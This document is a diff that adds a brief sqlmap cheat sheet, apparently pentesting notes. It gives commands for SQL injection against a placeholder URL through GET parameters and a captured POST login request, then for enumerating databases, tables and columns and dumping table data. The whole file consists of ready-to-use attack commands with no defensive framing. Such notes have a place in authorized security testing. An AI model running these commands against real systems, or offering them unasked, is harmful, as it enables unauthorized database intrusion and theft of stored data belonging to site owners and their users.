@@ -1,0 +1,21 @@
+# GET Method
+sqlmap -u http://www.site.com/section.php?id=51
+
+# POST Method (requires captured POST request (burpsuite, etc.)), -p for parameter ([password]?=test)
+sqlmap -r login.txt -p password
+
+# DBMS Scope
+sqlmap -u http://www.site.com/section.php?id=51 --dbms mysql
+
+# Enumerate Databases
+sqlmap -u http://www.site.com/section.php?id=51 --dbs
+
+# Enumerate Tables
+sqlmap -u http://www.site.com/section.php?id=51 -D [database] --tables
+
+# Enumerate Columns
+sqlmap -u http://www.site.com/section.php?id=51 -D [database] -T [table] --columns
+
+# Dump Data
+sqlmap -u http://www.site.com/section.php?id=51 -D [database] -T [table] --dump
+
